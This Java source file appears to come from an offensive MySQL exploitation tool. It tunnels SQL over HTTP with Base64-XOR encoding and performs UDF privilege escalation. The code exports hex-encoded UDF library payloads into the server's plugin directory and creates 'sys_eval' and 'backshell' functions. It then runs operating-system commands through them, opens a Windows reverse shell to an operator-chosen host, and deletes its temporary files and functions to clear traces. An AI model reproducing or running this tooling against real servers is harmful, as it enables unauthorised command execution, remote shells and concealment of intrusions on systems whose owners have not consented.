package Dao;

import Controller.MysqlController;
import Entity.ControllersFactory;
import Util.*;
import org.json.JSONObject;
import java.io.File;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.nio.charset.StandardCharsets;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * @author ch1ng
 * @date 2021/12/18
 */
public class MysqlHttpDao {

    /**
     * 用此方法获取 MysqlController 的日志框
     */
    private MysqlController mysqlController = (MysqlController) ControllersFactory.controllers.get(MysqlController.class.getSimpleName());
    private String version;
    private String mysqlPlatform;
    private String systemPlatform;
    private Map<String, String> headers = new HashMap<>();
    private Map<String, String> params = new HashMap<>();
    private Map currentProxy = new HashMap();

    private String remoteOutfile;
    private String udfFullPath;
    private String pluginFile;
    private String reversePluginFile;
    private String randomPluginFile;
    private List<String> tempFiles = new ArrayList<String>();

    private JSONObject dataObj;

    public MysqlHttpDao(JSONObject dataObj){
        this.dataObj = dataObj;
    }

    //{"ishttp":"false","databasetype":"Mysql","ipaddress":"10.211.55.5","proxyport":"","proxyusername":"","httpheaders":"","proxytype":"","proxyaddress":"","memo":"","encryptionkey":"","timeout":"5","url":"","proxypassword":"","isproxy":"false","password":"root","database":"test","connecttype":"常规连接","port":"3306","addtime":"2021-08-20 17:36:32","id":3,"username":"root"}

    //127.0.0.1:3306|root|root|test|select 1

    public String testConnection(){
        String sql = MysqlSqlUtil.checkSql;
        String randomString = Utils.getRandomString();
        sql = Base64XOR.base64Encode(String.format(sql, randomString).getBytes(StandardCharsets.UTF_8),"UTF-8");
        try {
            String response = executeSQLStatement(this.dataObj,sql,"UTF-8");
            if(randomString.equals(response)){
                return "连接成功";
            }else if(response.contains("ERROR://")){
                return "连接失败！" + response.replace("ERROR://","");
            }
        } catch (Exception ex) {
            String error = ex.getMessage();
            MessageUtil.showExceptionMessage(ex, error);
        }
        return "连接失败";
    }

    public void getConnection(){
        String sql = MysqlSqlUtil.checkSql;
        String randomString = Utils.getRandomString();
        sql = Base64XOR.base64Encode(String.format(sql, randomString).getBytes(StandardCharsets.UTF_8),"UTF-8");
        try {
            String response = executeSQLStatement(this.dataObj,sql,"UTF-8");
            if(randomString.equals(response)){
                mysqlController.mysqlLogTextArea.appendText(Utils.log("连接成功！"));
            }else if(response.contains("ERROR://")){
                mysqlController.mysqlLogTextArea.appendText(Utils.log("连接失败！" + response.replace("ERROR://","")));
            }
        } catch (Exception ex) {
            String error = ex.getMessage();
            MessageUtil.showExceptionMessage(ex, error);
        }
    }

    /**
     * 获取数据库基本信息
     */
    public void getInfo() {
        String sql = MysqlSqlUtil.getInfoSql;
        sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8),"UTF-8");
        try {
            String response = executeSQLStatement(this.dataObj,sql,"UTF-8");
            if(response.contains("~") && !response.contains("ERROR://")){
                String[] udfInfo =  response.split("~");
                this.version = udfInfo[0];
                this.mysqlPlatform = udfInfo[1];
                this.systemPlatform = udfInfo[2];
                String res = Utils.log(String.format("Mysql 版本：%s 系统平台：%s 系统位数：%s", this.version, this.mysqlPlatform, this.systemPlatform));
                mysqlController.mysqlLogTextArea.appendText(res);
                this.initUDF();
            }else {
                mysqlController.mysqlLogTextArea.appendText(Utils.log("获取基本信息失败！" + response.replace("ERROR://","")));
            }
        } catch (Exception ex) {
            String error = ex.getMessage();
            MessageUtil.showExceptionMessage(ex, error);
        }


    }

    /**
     * udf 初始化
     */
    private void initUDF() {
        // UDF初始化
        try {
            if (this.version != null && this.mysqlPlatform != null && this.systemPlatform != null) {
                this.versionOutfile();
                this.Option();
                mysqlController.mysqlLogTextArea.appendText(Utils.log("本地 UDF 初始化成功,可尝试进行 UDF 提权"));
            } else {
                mysqlController.mysqlLogTextArea.appendText(Utils.log("Mysql 版本信息获取有误"));
            }
        } catch (Exception e) {
            MessageUtil.showExceptionMessage(e, e.getMessage());
        }
    }

    /**
     * 确定导出路径
     * MySQL<5.0，导出路径随意；
     * 5.0 <= MySQL<5.1，则需要导出至目标服务器的系统目录（如：c:/windows/system32/）
     * MySQL 5.1以上版本，必须要把udf.dll文件放到MySQL安装目录下的lib\plugin文件夹下才能创建自定义函数。
     */
    public void versionOutfile() {
        if (this.version != null) {
            String[] versions = version.split("\\.");
            if (Integer.parseInt(versions[0]) < 5) {
                if (mysqlPlatform.startsWith("Win")) {
                    remoteOutfile = "c:\\windows\\temp\\";
                } else {
                    remoteOutfile = "/tmp/";
                }
            } else {
                this.plugin_dir();
            }
        }
    }

    /**
     * 确定本地使用udf函数文件路径
     * 测试发现win64系统下安装win32 mysql dll库依赖32位mysql 64失效
     */
    private void Option() {
        try {
            String path = null;
            if (mysqlPlatform.startsWith("Win")) {
                mysqlController.mysqlLogTextArea.appendText(Utils.log("Windows 服务器 UDF 失败可尝试直接反弹 Shell"));
                int versionNumber = Integer.parseInt(mysqlPlatform.substring(3));
                if (versionNumber == 32) {
                    path = Utils.getSelfPath() + File.separator + "Plugins" + File.separator + "Mysql" + File.separator + "udf_win32_hex.txt";
                    pluginFile = Utils.readFile(path).replace("\n","");
                } else {
                    path = Utils.getSelfPath() + File.separator + "Plugins" + File.separator + "Mysql" + File.separator + "udf_win64_hex.txt";
                    pluginFile = Utils.readFile(path).replace("\n","");
                }
            } else {
                if (systemPlatform.contains("64")) {
                    path = Utils.getSelfPath() + File.separator + "Plugins" + File.separator + "Mysql" + File.separator + "udf_linux64_hex.txt";
                    pluginFile = Utils.readFile(path).replace("\n","");
                } else {
                    path = Utils.getSelfPath() + File.separator + "Plugins" + File.separator + "Mysql" + File.separator + "udf_linux32_hex.txt";
                    pluginFile = Utils.readFile(path).replace("\n","");
                }
            }
        } catch (Exception e) {
            MessageUtil.showExceptionMessage(e, e.getMessage());
        }
    }

    /**
     * mysql >= 5.1 获取插件目录
     */
    private void plugin_dir() {

        String sql = MysqlSqlUtil.pluginDirSql;
        sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8),"UTF-8");
        try {
            remoteOutfile = executeSQLStatement(this.dataObj,sql,"UTF-8");
            if(remoteOutfile.contains("ERROR://")){
                mysqlController.mysqlLogTextArea.appendText(Utils.log("获取插件目录失败！" + remoteOutfile.replace("ERROR://","")));
                return;
            }
            if (mysqlPlatform.startsWith("Win")) {
                remoteOutfile = remoteOutfile.replace("\\", "\\\\");
            }
        } catch (Exception ex) {
            String error = ex.getMessage();
            MessageUtil.showExceptionMessage(ex, error);
        }
    }

    /**
     * 导入插件
     */
    public void importUDF(String funcEvil) {
        String content;
        try {
            if (funcEvil.equals("backshell")) {
                content = reversePluginFile;
            } else {
                content = pluginFile;
            }
            // 清除遗留函数
            this.removeEvilFunc();
            this.removeBackshellFunc();
            // 初始化完整udf导出路径
            randomPluginFile = Long.toHexString(Double.doubleToLongBits(Math.random())) + ".temp";
            // 清理所有残留临时文件
            tempFiles.add(randomPluginFile);
            // 获取完整导出路径
            udfFullPath = remoteOutfile + randomPluginFile;
            String sql = String.format(MysqlSqlUtil.udfExportSql, content,udfFullPath);
            sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String response = executeSQLStatement(this.dataObj,sql,"UTF-8");
            if(response.contains("ERROR://")){
                mysqlController.mysqlLogTextArea.appendText(Utils.log("函数 "+ funcEvil +" 导入失败！" + response.replace("ERROR://","")));
                return;
            }else {
                mysqlController.mysqlLogTextArea.appendText(Utils.log("函数 " + funcEvil + " 导入成功！"));
            }
            createMethod(funcEvil,randomPluginFile);
        } catch (Exception e) {
            MessageUtil.showExceptionMessage(e, e.getMessage());
        }
    }

    /**
     * 创建方法
     * @param funcEvil
     * @param randomPluginFile
     */
    public void createMethod(String funcEvil,String randomPluginFile) {
        String sql = String.format(MysqlSqlUtil.createFunctionSql,funcEvil,randomPluginFile);
        sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8),"UTF-8");
        try {
            String response = executeSQLStatement(this.dataObj,sql,"UTF-8");
            if(response.contains("ERROR://")){
                mysqlController.mysqlLogTextArea.appendText(Utils.log("函数 "+ funcEvil +" 创建失败！" + response.replace("ERROR://","")));
            }else {
                mysqlController.mysqlLogTextArea.appendText(Utils.log("函数 " + funcEvil + " 创建成功！"));
            }
        } catch (Exception e) {
            MessageUtil.showExceptionMessage(e, e.getMessage());
        }
    }


    /**
     * 清理Evil方法
     */
    public void removeEvilFunc() {
        String sql = MysqlSqlUtil.cleanSql;
        sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8),"UTF-8");
        try {
            String response = executeSQLStatement(this.dataObj,sql,"UTF-8");;
            if(response.contains("ERROR://")){
                mysqlController.mysqlLogTextArea.appendText(Utils.log("删除 sys_eval 函数失败！" + response.replace("ERROR://","")));
            }else {
                mysqlController.mysqlLogTextArea.appendText(Utils.log("删除 sys_eval 函数成功！"));
            }
        } catch (Exception e) {
            MessageUtil.showExceptionMessage(e, e.getMessage());
        }
    }

    /**
     * 清理Backshell方法
     */
    public void removeBackshellFunc() {
        String sql = MysqlSqlUtil.cleanSql2;
        sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8),"UTF-8");
        try {
            String response = executeSQLStatement(this.dataObj,sql,"UTF-8");
            if(response.contains("ERROR://")){
                mysqlController.mysqlLogTextArea.appendText(Utils.log("删除 Backshell 函数失败！" + response.replace("ERROR://","")));
            }else {
                mysqlController.mysqlLogTextArea.appendText(Utils.log("删除 Backshell 函数成功！"));
            }
        } catch (Exception e) {
            MessageUtil.showExceptionMessage(e, e.getMessage());
        }
    }

    /**
     * 执行命令
     *
     * @param command
     * @return
     */
    public String eval(String command, String code) {
        String sql = String.format(MysqlSqlUtil.evalSql, command);
        sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8),"UTF-8");
        try {
            String response = executeSQLStatement(this.dataObj,sql,code);
            //Status | FUNCTION test.sys_eval does not exist
            if(response.contains("does not exist")){
                mysqlController.mysqlLogTextArea.appendText(Utils.log("命令函数不存在！请创建！"));
                return "";
            }else if(response.contains("ERROR://")){
                mysqlController.mysqlLogTextArea.appendText(Utils.log("执行命令失败！" + response.replace("ERROR://","")));
                return "";
            } else {
                return response;
            }
        } catch (Exception e) {
            MessageUtil.showExceptionMessage(e, e.getMessage());
        }
        return "";
    }

    /**
     * ntfs 创建目录
     *
     * @throws SQLException
     */
    public void ntfsdir() {
        String sql = String.format(MysqlSqlUtil.ntfsCreateDirectory,remoteOutfile.substring(0, remoteOutfile.length() - 1) );
        sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8),"UTF-8");
        try {

            String response = executeSQLStatement(this.dataObj,sql,"UTF-8");
            //Status | FUNCTION test.sys_eval does not exist
            if(response.contains("already exists")){
                mysqlController.mysqlLogTextArea.appendText(Utils.log("目录已存在！"));
            }else if(response.contains("ERROR://")){
                mysqlController.mysqlLogTextArea.appendText(Utils.log("目录创建失败！" + response.replace("ERROR://","")));
            }else {
                mysqlController.mysqlLogTextArea.appendText(Utils.log("目录创建成功！"));
            }
        } catch (Exception e) {
            MessageUtil.showExceptionMessage(e, e.getMessage());
        }
    }

    /**
     * 清理痕迹
     *
     * @throws SQLException
     */
    public void cleanudf() {
        String rmplugin = null;
        try {
            mysqlController.mysqlLogTextArea.appendText(Utils.log("删除服务器UDF遗留文件"));
            String tempPath = remoteOutfile + "*.temp";
            if (mysqlPlatform.startsWith("Win")) {
                rmplugin = "del /f " + tempPath;
            } else {
                rmplugin = "rm -f " + tempPath;
            }
            eval(rmplugin, "UTF-8");
            mysqlController.mysqlLogTextArea.appendText(Utils.log("卸载所有恶意函数"));
            // 删除恶意函数
            this.removeEvilFunc();
            this.removeBackshellFunc();
        } catch (Exception e) {
            MessageUtil.showExceptionMessage(e, e.getMessage());
        }
    }

    /**
     * win 反弹shell
     *
     * @throws SQLException
     */
    public void reverseShell(String reverseAddress, String reversePort, String code) {
        try {
            // 重新加载反弹shell dll
            String path = Utils.getSelfPath() + File.separator + "Plugins" + File.separator + "Mysql" + File.separator + "udf_win_ex_hex.txt";
            reversePluginFile = Utils.readFile(path).replace("\n","");
            importUDF("backshell");
            backShell(reverseAddress, Integer.parseInt(reversePort), code);
        } catch (Exception e) {
            MessageUtil.showExceptionMessage(e, e.getMessage());
        }
    }

    /**
     * backShell win反弹shell
     *
     * @throws SQLException
     */
    public void backShell(String reverseAddress, int port, String code) {
        String sql = String.format(MysqlSqlUtil.reverseShellSql, reverseAddress, port);
        sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8),"UTF-8");
        try {
            String response = executeSQLStatement(this.dataObj,sql,"UTF-8");
            if(response.contains("ERROR://")){
                mysqlController.mysqlLogTextArea.appendText(Utils.log("Shell 反弹失败！" + response.replace("ERROR://","")));
            }else {
                mysqlController.mysqlLogTextArea.appendText(Utils.log("Shell 反弹成功！"));
            }
        } catch (Exception e) {
            MessageUtil.showExceptionMessage(e, e.getMessage());
        }
    }



    /**
     * 执行 Sql 语句
     * @param dataObj
     * @param sql
     * @return
     */
    private String executeSQLStatement(JSONObject dataObj,String sql,String code) {
        String url = dataObj.getString("url");
        String timeOut = dataObj.getString("timeout");
        String isProxy = dataObj.getString("isproxy");
        String header = dataObj.getString("httpheaders");
        String key = dataObj.getString("encryptionkey");
        String args = dataObj.getString("ipaddress" )+ ":" + dataObj.getString("port") + "|";
        args += dataObj.getString("username") + "|";
        args += dataObj.getString("password") + "|";
        args += dataObj.getString("database") + "|";
        args += sql;
        //args += Base64XOR.base64Encode(String.format(sql, randomString).getBytes(StandardCharsets.UTF_8),"UTF-8");
        params.put(key, Base64XOR.encode(args,key));
        try {
            if(!header.equals("")){
                headers = Utils.splitHeaders(header);
            }
            if(!isProxy.equals("false")){
                Proxy proxy;
                String proxyAddress = this.dataObj.getString("proxyaddress");
                String proxyType =  this.dataObj.getString("proxytype");
                String proxyPort = this.dataObj.getString("proxyport");
                String proxyuUername = this.dataObj.getString("proxyusername");
                String proxyPassword = this.dataObj.getString("proxypassword");
                InetSocketAddress proxyAddr = new InetSocketAddress(proxyAddress, Integer.parseInt(proxyPort));
                if("SOCKS5".equals(proxyType)){
                    proxy = new Proxy(Proxy.Type.SOCKS, proxyAddr);
                }else {
                    proxy = new Proxy(Proxy.Type.HTTP, proxyAddr);
                }
                currentProxy.put("proxy", proxy);
                currentProxy.put("username", proxyuUername);
                currentProxy.put("password", proxyPassword);
            }
            String response = OKHttpUtil.getBodyWithPost(url,params,headers,Integer.parseInt(timeOut),"UTF-8",currentProxy);
            return Base64XOR.decode(response,key,code);
        } catch (Exception ex) {
            String error = ex.getMessage();
            MessageUtil.showExceptionMessage(ex, error);
        }
        return "";
    }
}
